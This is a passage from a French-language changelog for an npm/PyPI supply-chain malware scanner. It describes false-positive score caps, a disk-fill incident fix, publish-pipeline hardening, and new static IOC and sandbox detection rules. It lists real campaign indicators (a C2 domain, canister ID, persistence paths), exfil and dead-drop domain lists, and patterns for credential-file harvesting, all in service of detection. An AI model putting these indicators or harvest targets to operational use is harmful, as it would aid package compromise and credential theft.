  (slopsquat staging via `bun x pkg@latest`) et `external_tarball_dep`
  (dep-confusion) deviennent disqualifiants.
- **`F9_EXFIL_TYPES`** conserve pour back-compat externe (audit scripts) :
  union HARD + 3 SOFT historiques (`suspicious_dataflow`,
  `intent_credential_exfil`, `intent_command_exfil`).

#### Threat model

Verifie contre les 3 MALWARE de la semaine HEBDO 2026-05-18→24
(`@cseo-hr/trpweb-shared` dep-confusion, `build-scripts-utils` +
`project-init-tools` twin staging campagne P-2024-001) : tous emettent
au moins un signal HARD (`external_tarball_dep`, `remote_code_load`,
`binary_dropper`) → restent bloques par F14. Verifie contre les
signatures Shai-Hulud 2.0/3.0 (`suspicious_domain` C2 attaquant,
`binary_dropper` TruffleHog, `download_exec_binary`,
`external_tarball_dep` Bun runtime fetch) → tous HARD → bloques.
`postmark-mcp` (premier MCP malveillant publique) : `suspicious_domain`
vers mailbox attaquant → bloque.

L'ajout de `remote_code_load` + `external_tarball_dep` a F11 ferme la
porte slopsquat 2026 (LLM hallucine `bun x fake-pkg@latest` → attaquant
register le nom → F11 ne capait pas avant F14).

#### Impact mesure (sample 107 FP rescannes)

| Bucket | Pre-F14 | Post-F14 projete |
|---|---|---|
| Capes (score < 90) | 61 (57%) | 86 (80%) |
| Encore >= 90 | 46 (43%) | 21 (20%) |

Les 21 restants ont tous au moins un signal HARD (`remote_code_load`
pour gm-skill cluster, `binary_dropper` pour threatspan/tokentracker,
`suspicious_domain` pour @inetafrica/open-claudia cluster Chinese MCP
rerouting). Ce sont des cas qui meritent review humaine — le scoring
fait son travail.

#### Tests

`tests/unit/ml-feature-extractor.test.js` : 8 nouveaux tests F14 (3
positifs SOFT-only TRUE pour F9/F10/F11 + 5 negatifs HARD-present FALSE
couvrant `binary_dropper`, `external_tarball_dep`,
`dependency_url_suspicious`, `remote_code_load`). 1 test existant
(`ai_agent_bot: TRUE on multi-LLM orchestrator (gm-skill pattern)`) mis
a jour : retrait du threat `remote_code_load` du fixture (correctement
bloquant post-F14) ; le cas avec `remote_code_load` est desormais
couvert par le test F14 dedie.

Total : **3664 passed, 0 failed** (14511 skipped Docker).

## [2.11.30] - 2026-05-24

### Archive retention — defense in depth (disk-fill incident fix)

Reaction a l'incident du 2026-05-24 ou le VPS prod (96 GB) est passe a 100 %
disque, ce qui a corrompu `~/.claude.json` (writes tronques) et propage
+89 563 erreurs "other" cote monitor (impossibilite d'ecrire resultats /
tarballs). Recovery manuelle : suppression des archives > 7 jours, retour a
53 % d'occupation.

Cause racine : trois defaillances cumulees.

1. `DEFAULT_RETENTION_DAYS = 30` dans `src/monitor/tarball-archive.js`.
2. `MUADDIB_ARCHIVE_RETENTION_DAYS` jamais set (ni systemd, ni `.env`).
3. `cleanupOldArchives()` cable uniquement au startup (`daemon.js:502`) —
   service long-running = aucune purge en regime stationnaire.

Math : ~4.5 GB/jour d'archives x 30 jours = ~135 GB, mathematiquement
impossible sur 96 GB.

#### Changements

- **Baisse** `DEFAULT_RETENTION_DAYS` 30 → **7** dans
  `src/monitor/tarball-archive.js`. Math : 7d x 4.5 GB ≈ 31 GB, ~36 GB de
  marge sur disque 96 GB meme en regime de pic (5.8 GB/j).
- **Ajoute** `startPeriodicCleanup(intervalMs)` dans `tarball-archive.js` :
  setInterval `.unref()` qui re-execute `cleanupOldArchives()` toutes les
  6 h. Empeche un daemon up plusieurs semaines d'accumuler des archives
  au-dela de la fenetre de retention.
- **Cable** `startPeriodicCleanup()` dans `src/monitor/daemon.js` apres le
  cleanup de startup.
- **Ajoute** `hasEnoughSpace(targetDir)` + gate dans `archiveSuspectTarball`
  (avant `fs.mkdirSync`). Utilise `fs.statfsSync` (Node ≥ 18.15, fail-open
  sinon). Skip si `<5 GB` libre, env-configurable via
  `MUADDIB_ARCHIVE_MIN_FREE_GB` (borne [1, 100] GB). Filet de securite si
  une campagne malveillante deborde le budget 7 j avant le prochain tick
  periodique.
- **Ajoute** `Environment=MUADDIB_ARCHIVE_RETENTION_DAYS=7` dans
  `deploy/muaddib-monitor.service` — ceinture + bretelles avec le default
  code, survit a un revert accidentel.

#### Threat model

Defense en profondeur : trois couches independantes, chacune suffisante a
elle seule pour empecher le crash, qui n'ont aucun point commun de
defaillance.

| Couche | Mecanisme | Empeche |
|---|---|---|
| 1 | `DEFAULT_RETENTION_DAYS = 7` | Croissance unbounded (cause racine) |
| 2 | `startPeriodicCleanup()` (every 6h, `.unref()`) | Service long-running qui n'a jamais l'occasion de purger |
| 3 | `hasEnoughSpace()` pre-check | Burst de campagne malveillante qui depasse le budget 7 j avant tick 6h |

#### Tests

- 3 nouveaux dans `tests/unit/tarball-archive.test.js` : default = 7,
  tick periodique purge bien le repertoire ancien (interval 50 ms),
  archive skip quand `fs.statfsSync` mockee retourne ~0 octets libres.
- Total : 3653 → **3656** tests, 0 failed.

#### Deploiement VPS (manuel post-merge)

```
cd /opt/muaddib && git pull
sudo cp deploy/muaddib-monitor.service /etc/systemd/system/muaddib-monitor.service
sudo systemctl daemon-reload
sudo systemctl restart muaddib-monitor
```

Verification 24-48 h : `df -h /` doit rester < 70 %, `journalctl -u
muaddib-monitor | grep "Archive\] Purged"` doit montrer 1-2 ticks
periodiques, `ls /opt/muaddib/archive/ | wc -l` doit converger vers 7.

## [2.11.29] - 2026-05-22

### Publish pipeline hardening — defense in depth

Refonte du gate publish suite a l'incident `npm ci` EOVERRIDE en CI (runner
ubuntu-24.04 update du 2026-05-13, npm strict sur orphan overrides).
Remplacement de la protection symptomatique `overrides.loadash` par une
defense en profondeur cryptographique.

#### Changements

- **Retire** `package.json` `overrides.loadash` — protection symptomatique
  sur un seul nom typosquat, dependant d'une semantique d'override npm qui
  a derive entre runners.
- **Ajoute** `scripts.prepublishOnly` — bloque les `npm publish` hors-CI
  (requiert `CI=true`). Le seul path de publish autorise est tag `v*` push
  → workflow `publish.yml`.
- **Ajoute** etape `npm audit signatures` dans `publish.yml` (blocking) —
  verification SLSA des deps installees avant `npm test` et `npm publish`.
  Detecte tampering / MITM / registry compromise, pas seulement les
  typosquats hardcoded.
- **Ajoute** etape self-scan `node_modules` JSON dans `publish.yml`
  (informatif, non-blocking — FPs connus sur ajv/eslint). Archive dans les
  logs CI pour forensic post-incident.
- **Generalise** Guard 2 dans `publish.yml` : remplace le check hardcoded
  sur `dependencies.loadash` par `scripts/check-deps-typosquats.js`, qui
  appelle `findTyposquatMatch` (la propre detection du scanner) sur
  toutes les `dependencies` + `devDependencies` + `optional` + `peer`.
  Catch loadash/chlk/expresss/requestt/etc, plus juste un nom canary.
- **Exporte** `findTyposquatMatch` depuis `src/scanner/typosquat.js`
  (utilitaire pur, sync, sans network). Le require de `npm-registry.js`
  (qui tire `acorn` via `constants.js`) est rendu lazy pour que le guard
  `scripts/check-deps-typosquats.js` puisse tourner **avant `npm ci`**
  (sans aucune dep installee). Sinon le guard rate sa fonction de
  fail-fast preinstall et expose le runner aux lifecycle scripts d'un
  typosquat avant detection.

#### Threat model

L'override ne couvrait qu'un nom (`loadash`) et dependait d'un detail npm
fragile. Le nouveau gate couvre une surface plus large :

- **`npm audit signatures`** : detection cryptographique d'alteration de
  package depuis le registry (toutes deps, pas un nom).
- **Local-publish lockdown** : empeche un attacker avec acces workstation
  de publier en bypassant CI.
- **Self-scan forensic** : evidence d'investigation post-incident.

#### Versions intermediaires

Versions 2.11.25 a 2.11.28 absentes du CHANGELOG (a backfill hors-scope) :

- v2.11.25 — `fix: rip TRUSTED popularity whitelist, extract dep-diff scanner`
- v2.11.26 — `feat(monitor): did-NNNN campaign pre-alert watch`
- v2.11.27 — `fix(scoring): F12 vendor_minified_bundle FP cap`
- v2.11.28 — `fix(scoring): F13 typosquat_benign_lifecycle FP cap`

## [2.11.24] - 2026-05-19

### Audit week3 — Feature 11 (ai_agent_bot) — 54 FP cluster

Troisieme et dernier contextual FP cap derive de l'audit 2026-05-week3.
Cible le cluster `ai_agent_bot` (54 entries, 18.9 % des FP) : packages
qui SONT eux-memes des AI agents / multi-LLM orchestrators / chatbots /
IM⇄AI bridges. Examples : `gm-skill` (AI coding harness), `codexmate`
(multi-provider orchestrator), `lazyclaw` (terminal multi-LLM CLI),
`linco-connect` (WeChat→Claude bridge), `natureco-cli` (WhatsApp+Telegram),
`multis` (Telegram chatbot), `@aitne-sh/aitne` (personal AI daemon),
`@jhizzard/termdeck` (browser term mux), `triflux` (Claude Code router),
`opuscode` (Claude config wizard).

#### F11 (`ai_agent_bot`) — cap 35

Architecture du discriminator : ces packages firent legitimement
`dangerous_call_eval` (LLM tool-use feature), `remote_code_load`
(`bun x pkg@latest` pattern), `detached_credential_exfil` (local session
storage). F11 ne peut PAS blacklister ces threat types — ce sont les
capabilites core. Le discriminant vient de :

- **Preuve positive d'identite agent** (name/desc/keywords/deps signal)
- **Preuve d'operation sur agent runtime data** (paths `~/.claude/`,
  `~/.codex/`, `~/.cursor/`, etc.)
- **Absence de signatures SANDWORM_MODE** (no preinstall, no
  `mcp_config_injection` → F9, no `suspicious_domain`, no credential
  file harvest, no `binary_dropper` → F2).

Conjonction de 7 conditions :

- **C1** Identite AI agent — match d'au moins UN de : `meta.name` regex sur `AGENT_NAME_RE`, OU `meta.description` regex sur `AGENT_DESC_RE` (multi-provider, AI agent/bot/orchestrator/harness, telegram/whatsapp/wechat bridge), OU `meta.registryMeta.keywords` inclut un de `{agent, ai, llm, chatbot, bot, claude, codex, cursor, copilot, ollama, ...}`, OU `meta.registryMeta.dependencies` inclut un de `{@anthropic-ai/sdk, openai, @google/genai, ollama, telegraf, @whiskeysockets/baileys, whatsapp-web.js, discord.js, node-pty, ...}`.
- **C2** Pas d'install lifecycle hook (legit agents sont opt-in CLI invoke).
- **C3** Pas de `mcp_config_injection` (F9 garde la main).
- **C4** Pas de `suspicious_domain` threat (third-party exfil discriminator le plus clair).
- **C5** Pas de chemin credential file dans aucun message threat (anti-SANDWORM, reuse `F9_CREDENTIAL_FILE_RE`).
- **C6** Au moins UN threat reference un agent runtime path (`AGENT_RUNTIME_PATHS_RE` sur `threat.message` ET `threat.file`).
- **C7** Pas de `binary_dropper` ni `download_exec_binary` (F2 garde la main).

Cap value **35** (aligne F10). `Math.min` lowest-wins arbitre — C3 rend la
co-fire F9-F11 impossible par construction.

#### Pourquoi le AND est solide

Aucun MALWARE/PENTEST connu de l'audit week3 ne satisfait simultanement
les 7 conditions :
- Les droppers SANDWORM_MODE utilisent preinstall/postinstall (viole C2)
  OU lisent `.npmrc`/SSH/AWS (viole C5).
- Les MCP-impersonating malware firent `mcp_config_injection` (viole C3
  → F9 territory).
- Les exfilers ont `suspicious_domain` vers attacker host (viole C4).
- Les downloaders firent `binary_dropper` ou `download_exec_binary`
  (viole C7).
- Un malware qui fake l'identite agent ET passe toutes les autres
  conditions ET touche `~/.claude/` est theoriquement possible mais
  extremement specifique. Le cap reste a 35 (MEDIUM-HIGH, toujours
  alerte au monitor), pas une suppression complete.

#### Reutilisation (zero duplication)

- **Reuses depuis F9 (v2.11.22)** : `F9_CREDENTIAL_FILE_RE` pour C5.
- **Reuses depuis F10 (v2.11.23)** : aucun (pas besoin de bin entry — gm-hermes par ex n'a pas de bin).
- **Reuses existants** : `hasLifecycleScripts(meta)` pour C2.

#### Wiring

- `src/ml/feature-extractor.js` — helper `aiAgentBot(result, meta)`, 2 helpers internes (`_f11HasAgentIdentity`, `_f11HasAgentPathReference`), 5 constantes (`AGENT_RUNTIME_PATHS_RE`, `AGENT_NAME_RE`, `AGENT_KEYWORDS_SET`, `AGENT_DESC_RE`, `AGENT_DEPS`). Feature flag expose dans `extractFeatures()` comme `features.ai_agent_bot`.
- `src/scoring.js` — F11 ajoute apres F10 dans `applyContextualFPCaps()` avec cap 35.

#### Tests : 3594 → 3602 (+8)

- 8 unit tests sur `aiAgentBot` dans `tests/unit/ml-feature-extractor.test.js` :
  - TP : gm-skill pattern (name + deps `@anthropic-ai/sdk` + `~/.claude/gm-log` path access + remote_code_load).
  - TP alternatif : identite via description seule + `~/.claude/sessions/` path access (lazyclaw pattern).
  - FN : no AI agent identity (random-helper).
  - FN : preinstall lifecycle hook present.
  - FN : `mcp_config_injection` fires (F9 territory).
  - FN : `suspicious_domain` exfil signal.
  - FN : `.npmrc` cite dans message (SANDWORM harvest).
  - FN : pas de agent runtime path dans threats.
- Integration vector test etendu de 10 a 11 features.

#### Couverture estimee

30-40 des 54 entries (55-75 %). Le reste tombe dans d'autres clusters :
- Skill packs trivials sans path access direct (gm-hermes copies skills,
  ne touche pas `~/.claude/`) → tomberont sous F1 ou autre.
- Packages avec `suspicious_domain` legit vers providers chinois
  (yingclaw rerouting vers bigmodel.cn/api.deepseek.com) si la
  blacklist domain les marque suspects.

#### Out of scope

- ML retraining sur la feature `ai_agent_bot=1` — pipeline separe.
- Detection runtime des AI agent capabilities (sandbox) — F11 est un
  post-filter deterministe, pas une nouvelle scanner.
- Modification de F9 ou F10 — F11 est strictement additif.
- Re-mesure FPR sur les 545 curated — apres merge sur VPS.

#### Trajectoire restante

Les 3 caps F9/F10/F11 couvrent environ **115-150 entries sur 286** du
cluster audit (40-52 %). Le reste se repartit :
- `defensive_tool` (20) → F12 candidate sprint ulterieur
- `pypi_wrong_ecosystem` (23) → pipeline fix, pas un score cap
- `vendor_bundle_minified` (22) → couvert F1 partiellement
- `installer_binary_download` (19) → couvert F2 partiellement
- `cdp_playwright_automation` (12), `legitimate_crypto_vault` (6),
  `calendar_version_fp` (5), `wasm_bindgen_codegen` (4) → clusters
  mineurs, F-features dediees si confirme audit suivant.

F11 est le dernier cap "gros volume" du sprint week3.

---

## [2.11.23] - 2026-05-19

### Audit week3 — Feature 10 (vendor_cli_sdk) — 96 FP cluster

Deuxieme contextual FP cap derive de l'audit 2026-05-week3. Cible le plus
gros cluster residuel (96 entries, 33.6 % des FP) : vendor / community
CLIs et SDKs qui scoraient 75-100 a cause de `credential_regex_harvest`
+ `env_access` sur leur PROPRE gestion de credentials (Stripe checkout,
OAuth-PKCE, bearer tokens vers l'API vendor, .env template scaffolding).
Examples : `@nocobase/cli-v1`, `@posterly/cli`, `@super-hands/cli`,
`codeapp-js-cli`, `nodebb-plugin-flawless-donations`, `@aiyiran/myclaw`,
`usegrain`, `@tapestry-mud/cli`, `db-model-router`.

#### F10 (`vendor_cli_sdk`) — cap 35

Conjonction de 7 conditions :

- **C1** `bin` field present (CLI signal — droppers rarement exposent un bin).
- **C2** `credential_regex_harvest` / `env_access` / `env_charcode_reconstruction` / `credential_tampering` fire (le bruit FP).
- **C3** Pas de `mcp_config_injection` (F9 garde la main).
- **C4** Pas d'install lifecycle hook (legit vendor CLIs sont opt-in).
- **C5** Pas de signal d'exfil third-party (reutilise `F9_EXFIL_TYPES`, 15 types).
- **C6** Pas de chemin credential file dans les messages (reutilise `F9_CREDENTIAL_FILE_RE` — `.npmrc` / `.aws` / SSH / `.kube` / `.docker` / `.netrc` / `.git-credentials`).
- **C7** Vendor identity hint : `homepage` host present OU package scoped `@vendor/name`.

Cap value **35** (vs F9 a 30 car la conjonction est structurellement plus
faible — cluster plus large, identite moins restrictive). Le `Math.min`
lowest-wins arbitre proprement : F9 (cap 30) gagne si les deux firent —
mais C3 exclut cette combinaison par construction.

#### Pourquoi le AND est solide

Les droppers vendor-impersonating SANDWORM_MODE :
- N'exposent rarement un `bin` (viole C1).
- Utilisent preinstall/postinstall (viole C4).
- Exfilent vers attacker host (viole C5).
- Lisent `.npmrc` / SSH / AWS (viole C6).

#### Reutilisation

F10 ne dupplique aucun code F9 : reuse direct des constantes
`F9_EXFIL_TYPES` et `F9_CREDENTIAL_FILE_RE` definies en v2.11.22. Helpers
internes `_f10HasBinEntry` et `_f10HasVendorIdentity` sont specifiques a
F10.

#### Wiring

- `src/ml/feature-extractor.js` — helper `vendorCliSdk(result, meta)`, 2 helpers internes (`_f10HasBinEntry`, `_f10HasVendorIdentity`). Feature flag expose dans `extractFeatures()` comme `features.vendor_cli_sdk`.
- `src/scoring.js` — F10 ajoute apres F6 dans `applyContextualFPCaps()` avec cap 35.

#### Tests : 3586 → 3594 (+8)

- 8 unit tests sur `vendorCliSdk` dans `tests/unit/ml-feature-extractor.test.js` :
  - TP : nodebb Stripe plugin avec bin + Stripe env reads + homepage.
  - TP alternatif : identite via scoped `@vendor/cli` (pas de homepage).
  - FN : pas de bin entry.
  - FN : postinstall lifecycle hook.
  - FN : `mcp_config_injection` fires (F9 territory).
  - FN : `suspicious_domain` exfil signal.
  - FN : `.npmrc` cite dans le message (SANDWORM harvest).
  - FN : unscoped name + pas de homepage (identite manquante).
- Integration vector test etendu de 9 a 10 features.

#### Couverture estimee

60-75 des 96 entries du cluster (conjonction conservative). Les ~30
restants tombent dans d'autres clusters :
- Asset packages sans `bin` (Stencil components, design system bundles) → F1 (`bundle_without_install_scripts`)
- Quelques `vat-validator-mcp` mal-labelles dans le dataset → devraient passer F9 si MCP keyword detecte

#### Out of scope

- F11 (`ai_agent_bot`, 54 FP) — sprint suivant, spec esquissee dans le plan F9.
- Re-mesure FPR sur les 545 curated — apres merge sur VPS.

---

## [2.11.22] - 2026-05-19

### Audit week3 — Feature 9 (mcp_server_env_access) — 25 FP cluster

Premier contextual FP cap derive de l'audit 2026-05-week3 (Mini Shai-Hulud
aftermath). Le cluster `mcp_server_env_access` regroupe 25 FP legit MCP
installers/servers (Cachly, Roadmapfy, Llama Ventures, Flomenco, Supericons,
cf-memory-mcp, mcp-memory-service, etc.) qui scoraient 75-99 a cause du
triple-stacking `mcp_config_injection` CRITICAL + `env_access` + `credential_regex_harvest`
sur des lectures de cles provider parfaitement legitimes
(`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `STRIPE_*`, etc.).

#### F9 (`mcp_server_env_access`) — cap 30

Conjonction de 5 conditions (le AND est le discriminant vs SANDWORM_MODE) :

- **C1** Package self-identifies as MCP : `name` / `keywords` / `bin` / `description` match `mcp` / `mcp-server` / `mcp-init` / `model context protocol`, etc.
- **C2** Threat `mcp_config_injection` est present (signal positif que le package fait du MCP reellement, pas juste claim).
- **C3** Pas d'install lifecycle hook (`scripts.preinstall|install|postinstall` absent). Les MCP installers legitimes sont opt-in (`npx pkg init`).
- **C4** `env_access` / `credential_regex_harvest` citent UNIQUEMENT des cles provider connues (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `STRIPE_*`, `GEMINI_API_KEY`, etc.) ou des vars infra (`HOME`, `PATH`). Jamais `~/.npmrc`, `~/.aws/credentials`, `id_rsa`, `.ssh/`.
- **C5** Aucun signal d'exfil third-party (`suspicious_domain`, `remote_code_load`, `download_exec_binary`, `curl_env_exfil`, etc.). Un MCP installer legit ecrit `.mcp.json` et lit des env vars — il ne telecharge pas de payload.

Cap value **30** (aligne F1/F3). Ramene CRITICAL → MEDIUM. Le mecanisme
`Math.min` lowest-wins de `applyContextualFPCaps` arbitre proprement si
F9 co-fire avec un autre cap.

#### Pourquoi le AND est solide

Aucun des 15 MALWARE + 29 PENTEST samples de l'audit week3 ne satisfait
les 5 conditions simultanement :
- Les droppers SANDWORM_MODE n'ont pas l'identite MCP (C1) ou ont un
  preinstall (C3).
- Les credential harvests citent `.npmrc`/SSH/AWS (viole C4).
- Les MCP-imitating malware appellent home (viole C5).

#### Wiring

- `src/ml/feature-extractor.js` — helper `mcpServerEnvAccess(result, meta)`, constantes `KNOWN_PROVIDER_KEYS_LITERAL` (28 keys), `PROVIDER_KEY_SUFFIX_RE`, `F9_INFRA_KEYS`, `F9_CREDENTIAL_FILE_RE`, `F9_EXFIL_TYPES` (15 types), `MCP_NAME_RE`, `MCP_DESC_RE`. Feature flag expose dans `extractFeatures()` comme `features.mcp_server_env_access`.
- `src/scoring.js` — F9 ajoute apres F3 dans `applyContextualFPCaps()`. Construction de `meta.registryMeta` etendue avec `keywords` + `bin` (utilises par l'identite F9).
- `src/pipeline/processor.js` — `_pkgMeta` etendue avec `keywords` + `bin` lus depuis `package.json`.

#### Tests : 3577 → 3586 (+9)

- 7 unit tests sur `mcpServerEnvAccess` dans `tests/unit/ml-feature-extractor.test.js` :
  - TP : legit MCP installer (Roadmapfy) avec ANTHROPIC_API_KEY + OPENAI_API_KEY.
  - TP alternatif : identite via `bin: {*mcp*: ...}` + `keywords: ['mcp']` (Llama Ventures pattern).
  - FN : no MCP identity (innocent-helper dropper).
  - FN : preinstall lifecycle hook present.
  - FN : env_access cite `.npmrc` (SANDWORM harvest).
  - FN : exfil signal `suspicious_domain → kaixin8.top`.
  - FN : env_access cite un var inconnu (`WALLET_PRIVATE_KEY`).
- Test `extractFeatures: exposes all 9 cluster FP features as 0/1 integers` (etait `all 8`) etendu pour inclure `mcp_server_env_access`.

#### Out of scope de ce release

- F10 (`vendor_cli_sdk`, 96 FP) — sprint suivant, spec posee mais plus large.
- F11 (`ai_agent_bot`, 54 FP) — sprint suivant.
- Re-mesure FPR sur les 545 curated — a faire post-merge.

---

## [Unreleased] — Intel Triage : detection statique aligned sur 2026

### Contexte

Constat operateur : "ça fait des mois que la sandbox n'attrape rien". Recherche
internet confirme : Zenbox (sandbox commercial de pointe) a classe Axios npm
2026-03 CLEAN avec 99% de confiance ; les malwares 2026 (Sapphire Sleet/Axios,
TeamPCP, CanisterSprawl, xinference) cumulent hardware fingerprinting,
C2-side detection, decryption-keys-in-response-headers et rate-limit 48h pour
defaire les sandbox runtime. Le bon layer en 2026 = static IOC strings +
threat intel feeds + AST family compounds + git/registry diff. Cf. les 8
regles YARA d'Axios qui catch 100% des samples avec 5 string literals.

Ce changeset livre les briques static qui MARCHENT contre les attaques
courantes de 2026, et abandonne explicitement le sandbox v2 / honeypot
multi-port qui etait en chantier sur cette branche (memoire
`feedback_sandbox_wrong_layer.md` enregistree pour ne plus reproposer).

### Phase 1 — Quick wins (en place)

- **P1.1 Scanner IOC strings (YARA-style)** : `src/scanner/ioc-strings.js`
  + `iocs/string-iocs.yaml` (15 strings bootstrap : 9 d'Axios via
  N3mes1s gist + 3 TeamPCP + 1 GlassWorm + 2 CanisterSprawl). Loader
  `src/ioc/yaml-loader.js` etendu avec `loadStringIocsYAML()`. Match en
  source = score CRITICAL transverse a toutes les variantes qui reuse
  un meme stager. Rule `MUADDIB-IOC-001`. 8 unit tests.
- **P1.2 Rule C en AST static** : `src/scanner/anti-forensic.js` detecte
  le compound XOR loop + self-delete (unlink __filename / rename to .md/.bak)
  + decoy write (writeFile vers package.md/.bak/...). 3 of 3 = `anti_forensic_xor_autodelete`
  CRITICAL ; 2 of 3 = `anti_forensic_partial` HIGH. Rules `MUADDIB-AF-001/002`.
  Catch la classe csec autodelete (memoire) sans dependre du sandbox. 12 tests.
- **P1.3 Stub package detector (gap ltidi)** : `src/scanner/stub-package.js`
  fire CRITICAL `stub_package_external_payload` quand main file < 500 octets
  meaningful + dep URL externe (https/git) + lifecycle hook ; HIGH
  `stub_package_external_dep` sans lifecycle. Comments stripped avant la
  mesure. Rules `MUADDIB-STUB-001/002`. 11 tests.
- **P1.4 Bugfix deferred queue T2 fallback** : VERIFIE deja en place
  (Layer A dans classify.js + Layer B dans deferred-sandbox.js avec
  TIER1 carve-out). Memoire `project_deferred_queue_t2_fallback_bug.md`
  marquee FIXED.

### Phase 2 — Threat intel feeds

- **P2.3 Aikido Open Source Malware Feed** (nouveau) : npm + PyPI JSON
  pull depuis `malware-list.aikido.dev`. Smoke test live : **121 521 npm
  + 3 064 PyPI** entries MALWARE recuperees. Source-tagged `aikido`.
- **P2.6 Source-aware confidence scoring** : la dedup au scraper accumule
  desormais un array `sources: [{name, added_at}]` par entree IOC. Helper
  exporte `getSourceConfidence(pkg)` retourne `{tier, count, sources}` avec
  tiers `low` (1 source), `medium` (2), `high` (3+). Permet aux consumers
  webhook/diff de prioriser les alertes cross-confirmees.
- **P2.1 OSSF malicious-packages** + **P2.4 OSV.dev** : verifies en place
  (scrapeOSSFMaliciousPackages, scrapeOSVDataDump, scrapeOSVLightweightAPI).
- **P2.2 OpenSourceMalware.com** + **P2.5 Sonatype OSS Index** : differes
  (pas d'endpoint bulk documente / token operateur requis).

### Phase 3 — Compounds et IOCs supplementaires

Plutot qu'ajouter 6 detecteurs AST par famille, j'ai etendu `string-iocs.yaml`
avec les marqueurs uniques de chaque campagne. Le scanner P1.1 catch ainsi
les familles directement, sans nouveau code :

- **CanisterSprawl** : ICP canister ID `cjn37-uyaaa-aaaac-qgnva-cai` +
  dropper path `dist/env-compat.cjs`.
- **Hugging Face C2/CDN** : `huggingface.co/api/models` endpoint.
- **SAP credential stealer** : `Mini-Framework`.
- **Axios extension** : `sfrclak.com` C2 + macOS persistence path
  `/Library/Caches/com.apple.act.mond` + Windows registry key
  `MicrosoftUpdate`.

Deux compounds declaratifs ajoutes dans scoring.js :
- **`axios_family`** : `ioc_string_match` + `lifecycle_script` + `anti_forensic_partial`.
- **`stub_with_string_ioc`** : `stub_package_external_dep` + `ioc_string_match`.

### Phase 5 — Git vs npm diff

- **P5.1 `scripts/git-vs-npm-diff.js`** : CLI tool qui telecharge le tarball
  npm + l'archive GitHub correspondant au tag, hash chaque fichier source,
  et signale les `npm-only` ou `hash-differs`. Catch les compromissions
  publish-time (mode Axios = token vole, push de tarballs altered).
  Usage : `node scripts/git-vs-npm-diff.js <package> <version>`.

### Differes (avec raisons)

- **OpenSourceMalware.com** (P2.2) — pas d'endpoint bulk public.
- **Sonatype OSS Index** (P2.5), **Socket.dev API** (P6.1), **Phylum API**
  (P6.2), **VirusTotal hash matching** (P6.3) — tokens / comptes operateur
  requis.
- **P3.5 Ethereum smart contract C2 compound** — manque samples concrets.
- **P3.6 SAP credential compound** complet, **P5.2 maintainer history
  scoring** complet, **P5.3 CI/release tag mismatch** — chaque morceau
  necessite des heures supplementaires de detecteurs AST. Documente comme
  candidat enhancement.
- **Phase 4 entiere (auto-rule generation)** — bloquee sur le pipeline de
  collection de samples (P4.1) qui necessite tokens API ou seed list curate.

### Verification

- `node tests/run-tests.js` : **3380 passes, 0 failed** (STALENESS flake fix
  inclus dans cette PR).
- `node bin/muaddib.js scan tests/samples/ioc-strings/axios-realistic`
  fire **riskScore 100 CRITICAL** : 7 `ioc_string_match` distincts (Axios IOCs)
  + `anti_forensic_xor_autodelete` + `lifecycle_file_exec` + `lifecycle_script`.
- Fixture clean (`tests/samples/ioc-strings/clean-lib`) → riskScore 0 (zero FP).
- Smoke-test live Aikido feed : 121 521 npm + 3 064 PyPI MALWARE entries.
- 4 memories sauvegardees : `feedback_sandbox_wrong_layer`,
  `feedback_static_over_dynamic`, `reference_threat_intel_feeds`,
  `project_axios_2026_yara`. MEMORY.md index mis a jour.

### Phase 5 (2026-05-09) : Sandbox observation hardening 2026

Pas un retour au "sandbox v2" abandonne plus haut. Cette phase durcit la
sandbox **existante** (`docker/`, `src/sandbox/`) avec un trigger chirurgical
sur compounds static-only, des honeypots elargis pour les cibles 2026, et un
hardening anti-fingerprint complet. Le statique reste la couche primaire ; la
sandbox passe de "scan par defaut" a "tribunal borderline" sur la fenetre de
score `[15, 35]` quand un compound static suspect tire.

**Trigger chirurgical (nouveau module)**

`src/sandbox/compound-triggers.js` exporte `evaluateSandboxTrigger(threats, score, fileSizes)`
qui retourne `{shouldRun, compound, watchpoints, reason}`. 6 compounds finis,
fenetre de score `[15, 35]` (en-dessous = clean, au-dessus = deja definitif) :

- `lifecycle_install_chain` : cible Shai-Hulud, PhantomRaven
- `obfuscated_oversize` : cible Shai-Hulud `bun_environment.js` (10MB)
- `decrypt_then_execute` : cible Axios 2026 OrDeR_7077
- `stub_with_external_dep` : cible ltidi chain attack
- `invisible_blockchain` : cible GlassWorm Solana RPC
- `npm_token_self_use` : cible CanisterWorm self-publish

**Analyzer preload : 5 nouveaux signaux**

`src/sandbox/analyzer.js` reconnait 5 patterns supplementaires :

| Type | Severity | Trigger |
|------|----------|---------|
| `sandbox_honey_read` | CRITICAL si correle outbound non-registre, HIGH sinon | Lecture d'un fichier `*-decoy` (zero-day catcher) |
| `sandbox_persistence_write` | CRITICAL | WRITE `.bashrc`, `.zshrc`, `autostart`, `cron`, `systemd/user`, `LaunchAgents` |
| `sandbox_execve_chain_depth` | HIGH | `>=2` EXEC + dernier dangereux avec URL ou pipe |
| `sandbox_npm_self_invoke` | CRITICAL | `npm publish/deprecate/owner/token` depuis l'arbre install |
| `sandbox_runtime_deobfuscation_executed` | HIGH | `new Function()` avec body `>= 500` octets |

`VALID_CATEGORIES` etend `NEW_FUNCTION`, `MOCK_HTTP`, `MOCK_HTTP_BODY`,
`MOCK_DNS`, `MOCK_FETCH`.

**Network allowlist 2026** (`src/sandbox/network-allowlist.js`)

- `sfrclak.com` (Axios 2026 C2 hardcode), `discord.com`, `discordapp.com`
  ajoutes a `KNOWN_EXFIL_DOMAINS`
- Patterns famille pastebin (`pastebin.com`, `paste.ee`, `ghostbin.co`,
  `hastebin.com`)
- Patterns dynamic DNS abuse (`*.duckdns.org`, `*.no-ip.com`, `*.no-ip.org`,
  `*.dynu.net`, `*.afraid.org`, `*.hopto.org`, `*.zapto.org`)
- Patterns dead-drop (`npoint.io`, `jsonkeeper.com`, `glitch.me`, `repl.co`)
- Nouvelle classification `'blockchain'` pour Solana mainnet/devnet/testnet,
  Infura, Ankr, Alchemy, QuickNode, Chainstack, Moralis (14 endpoints + 7
  patterns regex). Le compound `invisible_blockchain` correle un acces ici
  avec un decodeur Unicode invisible pour upgrader le verdict.

**Preload Function constructor instrumentation** (`docker/preload.js`)

- Section 8b : Proxy sur `Function` qui logge `bodyLen`, `argsCount`,
  `bodyStart` pour chaque `new Function(...)` et `Function(...)`.
  `Reflect.construct/apply` preservent la semantique du constructeur. Wrap
  try/catch silencieux : aucune regression possible si V8 ou un module Node
  refuse le Proxy.
